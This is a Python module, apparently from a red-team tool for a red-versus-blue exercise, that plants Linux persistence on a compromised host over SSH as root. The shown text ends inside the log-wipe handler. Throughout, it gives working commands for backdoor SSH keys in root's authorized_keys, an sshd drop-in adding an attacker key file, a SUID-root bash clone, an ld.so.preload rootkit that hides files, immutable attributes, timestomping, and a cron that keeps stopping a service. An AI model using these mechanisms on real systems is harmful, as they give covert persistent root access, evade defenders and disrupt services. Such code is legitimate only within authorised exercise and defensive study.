"""persist_linux — the Linux half of `persist`: every family, the exact commands.

`persist.py` owns the family choice, the naming draw, the bookkeeping and the
restore plumbing. This module owns ONE thing: the mechanism per family. The
contract it satisfies is `apply(ctx, ip, family, names) -> Result` plus a
`FAMILIES` table of family -> handler, and a handler's job is small and strict:

* draw nothing. Every path, unit, account and marker comes out of `names`
  (drawn by `artifactnames.linux_names`), `NEEDS` asserts the family has the
  names it needs, and a handler that invents a literal path is the IOC factory
  this rewrite exists to remove.
* one round trip per family (two when the plant needs a binary upload), and the
  script reports present / created / repaired / failed itself, so the outcome
  is read off the box instead of assumed from rc.
* idempotent by construction. Every write is guarded by the same predicate that
  tells us whether the artifact is already there (`grep -qF || echo`, `[ -f ]`,
  `test -u`), and the handler's presence branch means a second run of the same
  family is `ok=True` with **nothing written and nothing recorded**. That is the
  re-plant path after blue cleans, and the single most important behaviour in
  this file: re-assertion may never duplicate a key line, a crontab entry, a
  unit file or a world artifact.
* never delete. A broken artifact is *moved* to `<path>.tlaloc-bak` before it is
  rewritten ("repaired"), a refused preload is parked rather than removed, and a
  log wipe keeps a copy of what it wiped. `rm` appears nowhere in a plant path;
  only in an undo recipe, where the organizer asked for it.
* nothing escapes. A transport error, a non-zero rc or a missing marker is
  `Result(False, ...)` with the reason; the family fails alone and the cycle
  continues. Only the shape of the call (unknown family, missing names) is
  rejected up front by `apply()`, and never as an exception.

Families (the order `persist.auto_order` walks them):

  systemd_unit  a sleeper unit in /etc/systemd/system, enabled --now
  profile       an /etc/profile.d snippet that re-adds the re-entry key on login
  sshd_dropin   an sshd_config.d drop-in + a red-only second AuthorizedKeysFile
  cron          /etc/cron.d entry that re-touches a marker
  cron_reaper   /etc/cron.d entry that re-stops a service we already took down
  timer         unit+timer pair that re-asserts the login hook every 5 min
  user_cron     a line in the foothold user's own spool + linger
  keys          the re-entry public key in authorized_keys (user, and root)
  suid          a SUID-root bash clone at a boring path
  preload       the ld.so.preload hider: red's paths vanish from readdir
  immu          chattr +i over red's planted files
  timestomp     mtimes matched to a system reference file
  logwipe       journal vacuum + auth/syslog rotation on a cron
  decoy         the procfilter hunt-bait: a hidden sleeper unhide(1) can flag

Three deliberate deviations from the earlier agent's mechanics, each one an
audit finding:

1. `logwipe` COPIES auth.log/syslog into a drawn backup directory before the
   truncation (the earlier agent truncated in place — a delete of evidence no
   restore table can undo).
2. A preload that fails its `LD_PRELOAD=<so> /bin/true` load test parks the .so
   and its conf as `.tlaloc-bak` instead of removing them, and reports the plant
   as `ok=False, installed=True` so the box's footprint still reaches the
   artifact and restore tables.
3. `chattr +i` never touches `/etc/ld.so.preload`: making the one file blue has
   to edit immutable would break the box's own repair path.
"""

import base64
import json
import os
import re
import shlex

from .artifactnames import title
from .base import Result, can_root, root_cmd

# The marker every plant script ends with, so a handler reads its outcome off
# the box (state=...) instead of assuming it from rc.
MARKER = "TLALOC_PLANT"
PROBE = "TLALOC_PROBE"

# Where a broken/refused artifact is parked: moved, never deleted. Same
# vocabulary as takedown's `.tlaloc-off` / `.tlaloc-bak`.
BAK = ".tlaloc-bak"

LD_PRELOAD = "/etc/ld.so.preload"

# Absolute paths worth hiding/hardening, harvested from this box's artifacts.
# ld.so.preload is excluded on purpose (see the module docstring).
_HARVEST_EXCLUDE = ("/dev/", "/proc/", "/sys/", LD_PRELOAD)
_HARVEST_RE = r"(/[\w./+@-]{3,})"
_UNIT_RE = r"\(([\w.@-]+\.service)\)"

# The decoy's argv camouflage: real kernel-thread names, deliberately NOT drawn
# from the pool. A themed name here is the tell unhide's neighbour lookup is
# looking for; the whole point is to be indistinguishable from the kernel's own
# workers.
KTHREADS = ("[kworker/u9:2]", "[kworker/3:1]", "[ksoftirqd/2]", "[migration/0]")


def _name(names, key, default=""):
    return names.get(key) or default


def _q(text):
    return shlex.quote(str(text))


def _staging_for(path):
    """`/usr/lib/.<label>/lib<label>.so` -> `/tmp/.<label>-upload` (the earlier
    agent's `/tmp/.<name>-upload` staging idiom, derived from the drawn label)."""
    label = os.path.basename(os.path.dirname(path)).lstrip(".")
    return f"/tmp/.{label or os.path.basename(path).lstrip('.')}-upload"


def _root_ssh(ctx, ip, fh, script, timeout=60):
    """The one transport idiom this module uses (root-cmd-wrapped, key-aware)."""
    return ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                       root_cmd(script, fh), timeout=timeout,
                       key_path=fh.get("key_path"))


def _parse(text, token=MARKER):
    """Key=value fields off the last `token ...` line of a script's output."""
    fields = {}
    for line in (text or "").splitlines():
        line = line.strip()
        if line.startswith(token):
            for token_word in line[len(token):].split():
                key, _, value = token_word.partition("=")
                if key:
                    fields[key] = value
    return fields


def _run_marked(ctx, ip, fh, script, timeout=60, token=MARKER):
    """One marked round trip. Returns (fields, raw, problem); fields is None
    exactly when problem is set."""
    try:
        rc, out, err = _root_ssh(ctx, ip, fh, script, timeout=timeout)
    except Exception as exc:                     # TransportError and friends
        return None, "", f"{type(exc).__name__}: {exc}"
    fields = _parse(out, token)
    if not fields:
        tail = (err or out or "").strip().replace("\n", " ")[:160]
        return None, out or "", f"rc={rc} and no {token} marker: {tail or 'no output'}"
    if rc != 0:
        return None, out or "", (f"rc={rc} (state={fields.get('state', '?')}): "
                                 f"{(err or out).strip()[:160]}")
    return fields, out or "", None


def _wrap(family, guard, create, owned=None):
    """The plant script every file-owning family shares.

    `guard` is the standing check (the predicate the artifact records as its
    `check_cmd`), so a box that already has the artifact takes the `present`
    branch and nothing is written. `owned`, when given, is a path this family
    owns exclusively: if it exists while the guard fails, the artifact is
    broken — move it aside and recreate.
    """
    lines = [f"if {guard}; then st=present; else", "  st=created"]
    if owned:
        lines.append(f"  [ -e {owned} ] && {{ mv -f {owned} {owned}{BAK} "
                     f"2>/dev/null && st=repaired; }}")
    lines.append(f"  {{ {create} ; }} || st=failed")
    lines.append("fi")
    lines.append(f'echo "{MARKER} family={family} state=$st"')
    return "\n".join(lines)


def _probe(ctx, ip, fh, guard, timeout=45):
    """(present, problem) — a standing check with no plant behind it."""
    script = (f'if {guard}; then echo "{PROBE} state=present"; '
              f'else echo "{PROBE} state=absent"; fi')
    fields, _, problem = _run_marked(ctx, ip, fh, script, timeout=timeout,
                                     token=PROBE)
    if fields is None:
        return False, problem
    return fields.get("state") == "present", None


def _present(family, ip):
    """Second run of a standing family: success, and nothing to record.

    No artifact and no restore recipe are emitted because nothing on the box
    changed — a duplicate artifact row is the flood persist.py's anti-flood rule
    exists to prevent, and the organizer's table already carries this plant's
    undo.
    """
    return Result(True, f"{family}: already standing on {ip} — re-asserted, "
                        "nothing rewritten", data={"state": "present"},
                  installed=False)


def _created(family, ip, detail, kind, paths, recipe, check_cmd=None):
    return Result(True, detail, data={"state": "created"},
                  artifacts=[{"ip": ip, "kind": kind, "detail": detail,
                              "check_cmd": check_cmd, "paths": list(paths)}],
                  restore={"recipe": list(recipe), "secrets": None})


def _failed(family, state, ip):
    return Result(False, f"{family}: the plant did not complete on {ip} "
                         f"(state={state}) — nothing to record")


# -- shared mechanics ---------------------------------------------------------

def artifact_paths(world, ip):
    """Absolute paths worth hiding/hardening, harvested from this box's
    artifacts. The earlier agent regexed the artifact detail; tlaloc also reads
    the recorded `paths`, which is the record persist.py actually wrote."""
    paths = set()
    for artifact in world.artifacts(ip):
        detail = artifact.get("detail") or ""
        paths.update(re.findall(_HARVEST_RE, detail))
        unit = re.search(_UNIT_RE, detail)
        if unit:
            paths.add(f"/etc/systemd/system/{unit.group(1)}")
        paths.update(artifact.get("paths") or ())
    return sorted(p for p in paths
                  if not p.startswith(_HARVEST_EXCLUDE) and p.count("/") >= 2)


def reentry_pubkey(ctx, comment):
    """(key line, problem) — the re-entry key the earlier agent kept at
    `<state_dir>/red_key`.

    Generated once per install and reused: `exec/ssh.py` already falls back to
    this private key when a password path is closed, so the plant and the
    transport have to agree on one file. The comment is this family's drawn
    label — a fixed comment survives every clean, because blue greps it once and
    has a list of every key we own (the rebuild's audit).
    """
    from pathlib import Path

    state_dir = Path(ctx.cfg["run"]["state_dir"])
    key_path = state_dir / "red_key"
    pub_path = state_dir / "red_key.pub"
    if not key_path.exists():
        try:
            import paramiko
            key = paramiko.RSAKey.generate(2048)
            key_path.parent.mkdir(parents=True, exist_ok=True)
            key.write_private_key_file(str(key_path))
            os.chmod(key_path, 0o600)
        except Exception as exc:
            return None, f"could not generate the re-entry key: {exc}"
    try:
        import paramiko
        key = paramiko.RSAKey.from_private_key_file(str(key_path))
        line = f"{key.get_name()} {key.get_base64()} {comment}"
    except Exception:
        try:                            # an earlier plant's public half is enough
            line = pub_path.read_text(encoding="utf-8").strip()
        except OSError as exc:
            return None, f"could not read the re-entry key: {exc}"
    try:
        pub_path.write_text(line + "\n", encoding="utf-8")
    except OSError:
        pass
    return line, None


def _home_of(user):
    return "/root" if user == "root" else f"/home/{user}"


def preload_install(ctx, ip, fh, so, conf=None, body="", staging=None,
                    post_enabled=(), timeout=90):
    """ONE /etc/ld.so.preload installer for every family that writes the file.

    `LD_PRELOAD=<so> /bin/true` is a PRECONDITION of this function, not a
    postcheck: a bad line in /etc/ld.so.preload breaks every binary on the box,
    and the cleanup script cannot even run to unfix itself (the earlier agent
    shipped two writers, one of which forgot this — audit finding #4). A refusal
    parks the .so and conf as `.tlaloc-bak`; nothing is ever removed.

    `post_enabled` runs only on the enabled path (the harvester families use it
    for the work that must not happen behind a refused filter).
    """
    lines = [
        "set -u",
        "st=created",
        f"[ -e {so} ] && {{ mv -f {so} {so}{BAK} 2>/dev/null && st=repaired; }}",
    ]
    if staging:
        lines.append(f"mkdir -p {os.path.dirname(so)} && mv -f {staging} {so} && "
                     f"chmod 644 {so} || st=failed")
    if conf is not None:
        b64 = base64.b64encode((body or "").encode()).decode()
        lines.append(f"echo {b64} | base64 -d > {conf} && chmod 644 {conf} "
                     f"|| st=failed")
    lines.append(f'if [ "$st" != failed ] && '
                 f"LD_PRELOAD={so} /bin/true >/dev/null 2>&1; then")
    lines.append(f"  touch {LD_PRELOAD}")
    lines.append(f"  grep -qF {so} {LD_PRELOAD} || echo {so} >> {LD_PRELOAD}")
    lines.append("  st=enabled")
    lines.append("else")
    park = f"  [ -e {so} ] && {{ mv -f {so} {so}{BAK} 2>/dev/null; "
    if conf is not None:
        park += f"mv -f {conf} {conf}{BAK} 2>/dev/null; "
    park += "}"
    lines.append(park)
    lines.append('  [ "$st" != failed ] && st=refused')
    lines.append("fi")
    if post_enabled:
        lines.append('if [ "$st" = enabled ]; then')
        lines.extend(f"  {line}" for line in post_enabled)
        lines.append("fi")
    lines.append(f'echo "{MARKER} family=preload_install state=$st"')
    return _run_marked(ctx, ip, fh, "\n".join(lines), timeout=timeout)


# -- the families -------------------------------------------------------------
# Each handler: (ctx, ip, fh, names) -> Result. The command text is the earlier
# agent's, with every literal replaced by a drawn name and every write behind its
# own idempotence guard.

def _systemd_unit(ctx, ip, fh, names):
    """The earlier agent's `_systemd`: a sleeper unit, enabled --now, that
    survives a reboot.

    Present = the unit file is there AND enabled (the artifact's own
    `check_cmd`), so a unit blue disabled or a file blue emptied is repaired by
    rewriting it — after the old bytes are moved to `.tlaloc-bak`.
    """
    unit = _name(names, "unit")
    desc = _name(names, "unit_desc") or f"{title(unit.removesuffix('.service'))} Service"
    path = f"/etc/systemd/system/{unit}"
    body = "\n".join([
        "[Unit]",
        f"Description={desc}",
        "[Service]",
        "ExecStart=/bin/sh -c 'while :; do sleep 300; done'",
        "[Install]",
        "WantedBy=multi-user.target",
        "",
    ])
    b64 = base64.b64encode(body.encode()).decode()
    guard = f"[ -f {path} ] && systemctl is-enabled {unit} >/dev/null 2>&1"
    create = (f"echo {b64} | base64 -d > {path} && systemctl daemon-reload "
              f"&& systemctl enable --now {unit} >/dev/null")
    fields, _, problem = _run_marked(
        ctx, ip, fh, _wrap("systemd_unit", guard, create, owned=path), timeout=90)
    if fields is None:
        return Result(False, f"systemd_unit: {problem}")
    if fields["state"] == "present":
        return _present("systemd_unit", ip)
    if fields["state"] == "failed":
        return _failed("systemd_unit", "failed", ip)
    detail = f"{unit} ({desc}) sleeper at {path}"
    return _created(
        "systemd_unit", ip, detail, "persist-systemd_unit", [path],
        [f"systemctl disable --now {unit}",
         f"mv -f {path} {path}{BAK}",
         "systemctl daemon-reload"],
        check_cmd=f"systemctl is-enabled {unit} 2>/dev/null | grep -q enabled")


def _profile(ctx, ip, fh, names):
    """The earlier agent's `_profiled`: an /etc/profile.d snippet that re-adds
    the re-entry key on every interactive login, so a clean that misses the
    profile file silently regrows access."""
    path = _name(names, "profile")
    comment = _name(names, "key_comment")
    pub, problem = reentry_pubkey(ctx, comment)
    if pub is None:
        return Result(False, f"profile: {problem}")
    home = _home_of(fh["user"])
    body = "\n".join([
        "#!/bin/sh",
        "# network telemetry helper",
        f"mkdir -p {home}/.ssh 2>/dev/null",
        f"grep -qF {comment} {home}/.ssh/authorized_keys 2>/dev/null || "
        f"echo '{pub}' >> {home}/.ssh/authorized_keys 2>/dev/null",
        "",
    ])
    b64 = base64.b64encode(body.encode()).decode()
    guard = f"[ -f {path} ] && grep -qF {comment} {path}"
    create = f"echo {b64} | base64 -d > {path} && chmod 644 {path}"
    fields, _, problem = _run_marked(
        ctx, ip, fh, _wrap("profile", guard, create, owned=path))
    if fields is None:
        return Result(False, f"profile: {problem}")
    if fields["state"] == "present":
        return _present("profile", ip)
    if fields["state"] == "failed":
        return _failed("profile", "failed", ip)
    detail = f"{path} re-adds the re-entry key ({comment}) on login"
    return _created("profile", ip, detail, "persist-profile", [path],
                    [f"mv -f {path} {path}{BAK}"],
                    check_cmd=f"test -f {path}")


def _sshd_dropin(ctx, ip, fh, names):
    """The earlier agent's `_sshd_dropin`: a second, red-controlled
    AuthorizedKeysFile — removing ~/.ssh/authorized_keys does not evict us."""
    dropin = _name(names, "sshd_dropin")
    keydir = _name(names, "keys_dir")
    user = fh["user"]
    comment = _name(names, "key_comment")
    pub, problem = reentry_pubkey(ctx, comment)
    if pub is None:
        return Result(False, f"sshd_dropin: {problem}")
    body = f"AuthorizedKeysFile {keydir}/%u .ssh/authorized_keys\n"
    b64 = base64.b64encode(body.encode()).decode()
    guard = f"[ -f {dropin} ] && [ -f {keydir}/{user} ]"
    create = (f"mkdir -p {keydir} && chmod 700 {keydir} && "
              f"mkdir -p /etc/ssh/sshd_config.d && "
              f"echo {b64} | base64 -d > {dropin} && chmod 644 {dropin} && "
              f"printf '%s\\n' '{pub}' > {keydir}/{user} && "
              f"chmod 600 {keydir}/{user} && "
              f"(systemctl reload ssh 2>/dev/null || systemctl reload sshd "
              f"2>/dev/null || true)")
    fields, _, problem = _run_marked(
        ctx, ip, fh, _wrap("sshd_dropin", guard, create, owned=dropin), timeout=90)
    if fields is None:
        return Result(False, f"sshd_dropin: {problem}")
    if fields["state"] == "present":
        return _present("sshd_dropin", ip)
    if fields["state"] == "failed":
        return _failed("sshd_dropin", "failed", ip)
    detail = (f"{dropin} adds AuthorizedKeysFile {keydir}/%u "
              f"(re-entry key for {user})")
    return _created(
        "sshd_dropin", ip, detail, "persist-sshd_dropin", [dropin, keydir],
        [f"mv -f {dropin} {dropin}{BAK}",
         f"mv -f {keydir} {keydir}{BAK}",
         "systemctl reload ssh 2>/dev/null || systemctl reload sshd "
         "2>/dev/null || true"],
        check_cmd=f"test -f {dropin} && test -f {keydir}/{user}")


def _cron(ctx, ip, fh, names):
    """The earlier agent's `_cron`: a /etc/cron.d entry that re-touches a marker
    every 10 min — a heartbeat blue can find and hunt."""
    path = _name(names, "cron")
    marker = _name(names, "cron_marker")
    line = f'*/10 * * * * root /bin/sh -c "touch {marker}"'
    guard = f"[ -f {path} ] && grep -qF '{marker}' {path}"
    create = f"echo '{line}' > {path} && chmod 644 {path}"
    fields, _, problem = _run_marked(ctx, ip, fh,
                                     _wrap("cron", guard, create, owned=path))
    if fields is None:
        return Result(False, f"cron: {problem}")
    if fields["state"] == "present":
        return _present("cron", ip)
    if fields["state"] == "failed":
        return _failed("cron", "failed", ip)
    detail = f"{path} re-touches {marker} every 10 min"
    return _created("cron", ip, detail, "persist-cron", [path],
                    [f"mv -f {path} {path}{BAK}"],
                    check_cmd=f"test -f {path}")


def _cron_reaper(ctx, ip, fh, names):
    """The earlier agent's `_rekill`: a cron that re-stops a service we already
    took down every 5 min — the direct counter to a blue restore.

    The earlier agent required the caller to name the unit. tlaloc has one source
    of truth for "which unit did we take down on this box": the impact ledger
    (takedown records the RESOLVED unit, so `roundcube` lands as `apache2`). With
    no recorded impact there is nothing to reap — and stopping a service we never
    took down would be an unlogged takedown, so that is an honest ok=False.
    """
    if not (ctx.cfg.get("effects") or {}).get("rekill_cron", True):
        return Result(False, "cron_reaper: the re-kill cron is off "
                             "(effects.rekill_cron)")
    impacts = [i for i in ctx.world.impacts() if i.get("ip") == ip]
    service = (impacts[-1].get("service") if impacts else "") or ""
    base = service.removesuffix(".service").strip()
    if not re.match(r"^[a-zA-Z0-9@._\-]+$", base or ""):
        return Result(False, f"cron_reaper: no downed scored service on {ip} to "
                             "reap — take one down first (the reaper only "
                             "re-stops a service we already broke)")
    if base in ("ssh", "sshd"):
        return Result(False, "cron_reaper: refusing to re-kill ssh — our own "
                             "access path")
    path = _name(names, "cron_reaper")
    line = (f'*/5 * * * * root /bin/sh -c "systemctl stop {base} >/dev/null '
            f'2>&1 || true"')
    guard = f"[ -f {path} ] && grep -qF 'stop {base}' {path}"
    create = f"printf '%s\\n' '{line}' > {path} && chmod 644 {path}"
    fields, _, problem = _run_marked(
        ctx, ip, fh, _wrap("cron_reaper", guard, create, owned=path))
    if fields is None:
        return Result(False, f"cron_reaper: {problem}")
    if fields["state"] == "present":
        return _present("cron_reaper", ip)
    if fields["state"] == "failed":
        return _failed("cron_reaper", "failed", ip)
    detail = f"{path} re-stops {base} every 5 min (counter to a blue restore)"
    return _created("cron_reaper", ip, detail, "persist-cron_reaper", [path],
                    [f"mv -f {path} {path}{BAK}"],
                    check_cmd=f"grep -qF 'stop {base}' {path}")


def _timer(ctx, ip, fh, names):
    """The earlier agent's `_timer`: the timer twin of the reaper cron — a
    oneshot unit that re-asserts the login hook every 5 min, so deleting the cron
    file is not enough."""
    timer = _name(names, "timer")
    svc_path = f"/etc/systemd/system/{_name(names, 'timer_unit')}"
    tmr_path = f"/etc/systemd/system/{timer}"
    profile = _name(names, "profile")
    label = timer.removesuffix(".timer")
    svc_body = "\n".join([
        "[Unit]",
        f"Description={title(label)} Timer",
        "",
        "[Service]",
        "Type=oneshot",
        f"ExecStart=/bin/sh -c 'test -f {profile} || "
        f"echo \"\" > {profile}; exit 0'",
        "",
    ])
    tmr_body = "\n".join([
        "[Unit]",
        f"Description={title(label)} Timer",
        "",
        "[Timer]",
        "OnBootSec=2min",
        "OnUnitActiveSec=5min",
        "",
        "[Install]",
        "WantedBy=timers.target",
        "",
    ])
    b1 = base64.b64encode(svc_body.encode()).decode()
    b2 = base64.b64encode(tmr_body.encode()).decode()
    guard = (f"[ -f {svc_path} ] && [ -f {tmr_path} ] && "
             f"systemctl is-enabled {timer} >/dev/null 2>&1")
    create = (f"echo {b1} | base64 -d > {svc_path} && "
              f"echo {b2} | base64 -d > {tmr_path} && "
              f"systemctl daemon-reload && systemctl enable --now {timer} && "
              f"systemctl is-enabled {timer}")
    fields, _, problem = _run_marked(
        ctx, ip, fh, _wrap("timer", guard, create, owned=svc_path), timeout=90)
    if fields is None:
        return Result(False, f"timer: {problem}")
    if fields["state"] == "present":
        return _present("timer", ip)
    if fields["state"] == "failed":
        return _failed("timer", "failed", ip)
    detail = f"{timer} re-asserts {profile} every 5 min ({svc_path})"
    return _created(
        "timer", ip, detail, "persist-timer", [svc_path, tmr_path],
        [f"systemctl disable --now {timer}",
         f"mv -f {svc_path} {svc_path}{BAK}",
         f"mv -f {tmr_path} {tmr_path}{BAK}",
         "systemctl daemon-reload"],
        check_cmd=f"systemctl is-enabled {timer} 2>/dev/null | grep -q enabled")


def _user_cron(ctx, ip, fh, names):
    """The earlier agent's `_user_cron`: a line in the foothold user's own spool
    plus linger — a periodic task that never touches /etc/cron.d.

    The earlier agent appended unconditionally (`crontab -l; echo line | crontab
    -`), which duplicated the line on every re-plant. Here the append sits behind
    the same `grep -qF` guard the standing check uses, so re-assertion is a
    no-op.
    """
    user = fh["user"]
    if user == "root":
        return Result(False, "user_cron: the foothold is root — the /etc/cron.d "
                             "families already cover this box")
    marker = _name(names, "cron_marker")
    line = f"*/7 * * * * /bin/sh -c 'touch {marker}' >/dev/null 2>&1"
    guard = f"crontab -u {user} -l 2>/dev/null | grep -qF 'touch {marker}'"
    create = (f"( crontab -u {user} -l 2>/dev/null | grep -qF 'touch {marker}' || "
              f"( (crontab -u {user} -l 2>/dev/null; echo {json.dumps(line)}) | "
              f"crontab -u {user} - 2>/dev/null ) ) && "
              f"loginctl enable-linger {user} >/dev/null 2>&1")
    fields, _, problem = _run_marked(ctx, ip, fh, _wrap("user_cron", guard, create))
    if fields is None:
        return Result(False, f"user_cron: {problem}")
    if fields["state"] == "present":
        return _present("user_cron", ip)
    if fields["state"] == "failed":
        return _failed("user_cron", "failed", ip)
    detail = f"crontab entry for {user} touching {marker} every 7 min + linger"
    return _created(
        "user_cron", ip, detail, "persist-user_cron", [marker],
        [f"crontab -u {user} -l > {marker}.crontab.bak",
         f"crontab -u {user} -l 2>/dev/null | grep -vF 'touch {marker}' | "
         f"crontab -u {user} -",
         f"loginctl disable-linger {user}"],
        check_cmd=guard)


def _keys(ctx, ip, fh, names):
    """The earlier agent's `_sshkey`: the re-entry key in authorized_keys for the
    foothold user and for root — re-entry that survives a password rotation."""
    comment = _name(names, "key_comment")
    pub, problem = reentry_pubkey(ctx, comment)
    if pub is None:
        return Result(False, f"keys: {problem}")
    user = fh["user"]
    home = _home_of(user)
    user_keys = f"{home}/.ssh/authorized_keys"
    targets = [user_keys] + ([] if user == "root" else ["/root/.ssh/authorized_keys"])
    guard = " && ".join(f"grep -qF {comment} {p} 2>/dev/null" for p in targets)
    create = (f"mkdir -p {home}/.ssh && chmod 700 {home}/.ssh && "
              f"touch {user_keys} && ( grep -qF {comment} {user_keys} 2>/dev/null "
              f"|| echo '{pub}' >> {user_keys} ) && chmod 600 {user_keys}")
    if user != "root":
        root_keys = "/root/.ssh/authorized_keys"
        create += (f" && mkdir -p /root/.ssh && touch {root_keys} && "
                   f"( grep -qF {comment} {root_keys} 2>/dev/null || "
                   f"echo '{pub}' >> {root_keys} ) && chmod 600 {root_keys}")
    fields, _, problem = _run_marked(ctx, ip, fh, _wrap("keys", guard, create))
    if fields is None:
        return Result(False, f"keys: {problem}")
    if fields["state"] == "present":
        return _present("keys", ip)
    if fields["state"] == "failed":
        return _failed("keys", "failed", ip)
    detail = f"{comment} re-entry key in {' and '.join(targets)}"
    recipe = [f"grep -vF {comment} {path} > {path}{BAK} && mv -f {path}{BAK} {path}"
              for path in targets]
    return _created("keys", ip, detail, "persist-keys", targets, recipe,
                    check_cmd=" || ".join(f"grep -qF {comment} {p} 2>/dev/null"
                                          for p in targets))


def _suid(ctx, ip, fh, names):
    """The earlier agent's `_suid`: a SUID-root copy of bash at a boring path — a
    re-entry root path that does not depend on any credential blue can rotate."""
    dest = _name(names, "suid")
    guard = f"test -u {dest}"
    create = (f"(cp -f /bin/bash {dest} 2>/dev/null || cp -f /usr/bin/bash "
              f"{dest}) && chmod 4755 {dest} && test -u {dest}")
    fields, _, problem = _run_marked(
        ctx, ip, fh, _wrap("suid", guard, create, owned=dest), timeout=90)
    if fields is None:
        return Result(False, f"suid: {problem}")
    if fields["state"] == "present":
        return _present("suid", ip)
    if fields["state"] == "failed":
        return _failed("suid", "failed", ip)
    detail = f"SUID-root bash clone at {dest} (chmod 4755)"
    return _created("suid", ip, detail, "persist-suid", [dest],
                    [f"chmod u-s {dest}", f"mv -f {dest} {dest}{BAK}"],
                    check_cmd=f"test -u {dest}")


def _preload(ctx, ip, fh, names):
    """The earlier agent's `evasion_linux._preload`: the ld.so.preload hider —
    red's own paths disappear from a naive readdir() listing.

    The hider .so must be staged first (it is built at comp-prep, never on the
    box mid-event) and the hidden names are this box's artifacts, because the
    .so filters listings by name.
    """
    so_src = str((ctx.cfg.get("evasion") or {}).get("preload_so") or "")
    if not so_src or not os.path.exists(so_src):
        return Result(False, "preload: the hider .so is not staged — build it "
                             "and set evasion.preload_so on red01")
    hidden = sorted({os.path.basename(p) for p in artifact_paths(ctx.world, ip)})
    hidden = [h for h in hidden if h]
    if not hidden:
        return Result(False, "preload: no red artifact names on this box to hide "
                             "— plant a persistence family first")
    so = _name(names, "hider_so")
    conf = _name(names, "hider_conf")
    staging = _staging_for(so)
    guard = f"grep -qF {so} {LD_PRELOAD} 2>/dev/null && [ -f {so} ]"
    present, problem = _probe(ctx, ip, fh, guard)
    if problem:
        return Result(False, f"preload: {problem}")
    if present:
        return _present("preload", ip)
    try:
        ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", so_src, staging,
                         mode=0o644, key_path=fh.get("key_path"))
    except Exception as exc:
        return Result(False, f"preload: hider upload failed: {exc}")
    body = "".join(f"name {n}\n" for n in hidden)
    fields, _, problem = preload_install(ctx, ip, fh, so, conf=conf, body=body,
                                         staging=staging)
    if fields is None:
        return Result(False, f"preload: {problem}")
    state = fields["state"]
    detail = f"{so} in {LD_PRELOAD} hides: {' '.join(hidden)}; conf {conf}"
    recipe = [f"grep -vF {so} {LD_PRELOAD} > {LD_PRELOAD}{BAK} && "
              f"mv -f {LD_PRELOAD}{BAK} {LD_PRELOAD}",
              f"mv -f {so} {so}{BAK}",
              f"mv -f {conf} {conf}{BAK}"]
    if state == "enabled":
        return _created("preload", ip, detail, "persist-preload", [so, conf],
                        recipe, check_cmd=f"grep -qF {so} {LD_PRELOAD}")
    if state == "refused":
        return Result(
            False,
            f"preload: the load test refused the hider (`LD_PRELOAD={so} "
            f"/bin/true` failed) — {LD_PRELOAD} was left untouched and the .so "
            f"and conf are parked as {so}{BAK} / {conf}{BAK}",
            installed=True, data={"state": "refused"},
            artifacts=[{"ip": ip, "kind": "persist-preload",
                        "detail": f"{detail} (load test refused)",
                        "check_cmd": None, "paths": [so, conf]}],
            restore={"recipe": recipe, "secrets": None})
    return _failed("preload", state, ip)


def _immu(ctx, ip, fh, names):
    """The earlier agent's `evasion_linux._immu`: chattr +i over red's planted
    files, so a plain `rm` fails until blue notices the attribute and clears it
    first.

    Read off the box per path: newly-immutable counts as created, all-already
    counts as a no-op re-assertion, and every refusal is a failure (a family
    that claims to have hardened nothing is the kind of lie the ledger cannot
    afford).
    """
    paths = artifact_paths(ctx.world, ip)
    if not paths:
        return Result(False, "immu: nothing planted on this box to make "
                             "immutable — plant a family first")
    quoted = " ".join(_q(p) for p in paths)
    lines = [
        "set -u",
        "new=0; had=0; miss=0",
        f"for p in {quoted}; do",
        '  [ -e "$p" ] || { miss=$((miss+1)); continue; }',
        '  if lsattr -d "$p" 2>/dev/null | cut -d" " -f1 | grep -q i; then '
        "had=$((had+1));",
        '  elif chattr +i "$p" 2>/dev/null; then new=$((new+1));',
        "  else miss=$((miss+1)); fi",
        "done",
        'if [ "$new" -gt 0 ]; then st=created; elif [ "$had" -gt 0 ]; then '
        "st=present; else st=failed; fi",
        f'echo "{MARKER} family=immu state=$st" new=$new had=$had miss=$miss',
    ]
    fields, _, problem = _run_marked(ctx, ip, fh, "\n".join(lines), timeout=90)
    if fields is None:
        return Result(False, f"immu: {problem}")
    if fields["state"] == "present":
        return _present("immu", ip)
    if fields["state"] == "failed":
        return Result(False, f"immu: chattr +i was refused on every path "
                             f"({len(paths)} tried) — is the filesystem "
                             "immutable-attribute capable?")
    detail = f"chattr +i on: {' '.join(paths)}"
    return _created("immu", ip, detail, "persist-immu", paths,
                    [f"chattr -i {p}" for p in paths],
                    check_cmd=f"lsattr -d {paths[0]} 2>/dev/null | cut -d' ' "
                              f"-f1 | grep -q i")


def _timestomp(ctx, ip, fh, names):
    """The earlier agent's `evasion_linux._stomp`: mtimes matched to
    /etc/hostname, so a "files modified in the last hour" sweep comes back
    empty.

    The original mtimes are read (and printed) before the stomp, so the undo is
    a real `touch -d @<epoch>` per path instead of an apology.
    """
    paths = artifact_paths(ctx.world, ip)
    if not paths:
        return Result(False, "timestomp: nothing planted on this box to "
                             "timestomp — plant a family first")
    quoted = " ".join(_q(p) for p in paths)
    lines = [
        "set -u; same=1",
        f"for p in {quoted}; do",
        '  [ -e "$p" ] || continue',
        '  [ "$(stat -c %Y "$p" 2>/dev/null)" = '
        '"$(stat -c %Y /etc/hostname 2>/dev/null)" ] || same=0',
        "done",
        'if [ "$same" = "1" ]; then st=present; else st=stomped; fi',
        f'if [ "$st" = stomped ]; then for p in {quoted}; do',
        '  [ -e "$p" ] || continue',
        '  printf "TLALOC_MTIME %s %s\\n" "$(stat -c %Y "$p" 2>/dev/null)" "$p"',
        '  touch -r /etc/hostname "$p" 2>/dev/null',
        "done; fi",
        f'echo "{MARKER} family=timestomp state=$st"',
    ]
    fields, raw, problem = _run_marked(ctx, ip, fh, "\n".join(lines), timeout=90)
    if fields is None:
        return Result(False, f"timestomp: {problem}")
    if fields["state"] == "present":
        return _present("timestomp", ip)
    mtimes = {}
    for line in raw.splitlines():
        parts = line.strip().split()
        if len(parts) >= 3 and parts[0] == "TLALOC_MTIME":
            mtimes[parts[2]] = parts[1]
    detail = f"mtimes matched to /etc/hostname: {' '.join(paths)}"
    recipe = [f"touch -d @{mtimes[p]} {p}" for p in paths if p in mtimes]
    recipe += [f"touch {p}" for p in paths if p not in mtimes]
    return _created("timestomp", ip, detail, "persist-timestomp", paths, recipe,
                    check_cmd=None)


def _logwipe(ctx, ip, fh, names):
